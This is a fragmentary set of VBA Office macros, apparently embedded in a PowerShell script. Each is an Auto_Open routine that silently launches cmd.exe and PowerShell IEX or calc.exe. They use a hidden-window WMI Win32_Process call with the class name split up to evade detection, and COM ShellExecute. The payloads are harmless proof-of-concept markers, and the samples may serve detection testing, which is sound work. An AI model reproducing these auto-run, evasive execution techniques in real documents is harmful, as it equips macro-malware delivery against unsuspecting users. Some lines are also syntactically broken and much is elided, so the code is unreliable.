...
Sub Auto_Open()
    ...
    objProcess.Create "cmd.exe /c powershell.exe IEX ( echo 21 > c:\test.txt)", Null, objConfig, intProcessID
End Sub
"@
...
Sub Auto_Open()
    ...
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( touch 20 > user.txt)", Null, objConfig, intProcessID
End Sub
"@
...
Sub Auto_Open()
    ...
    SW.Document.Application.ShellExecute "cmd.exe" "calc.exe", "C:\Windows\System32", Null, 0
End Sub
"@
...
Sub Auto_Open()
    ...
    SBW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe IEX ( echo 22 > c:\poc.txt) ", "C:\Windows\System32", Null, 0
End Sub
"@
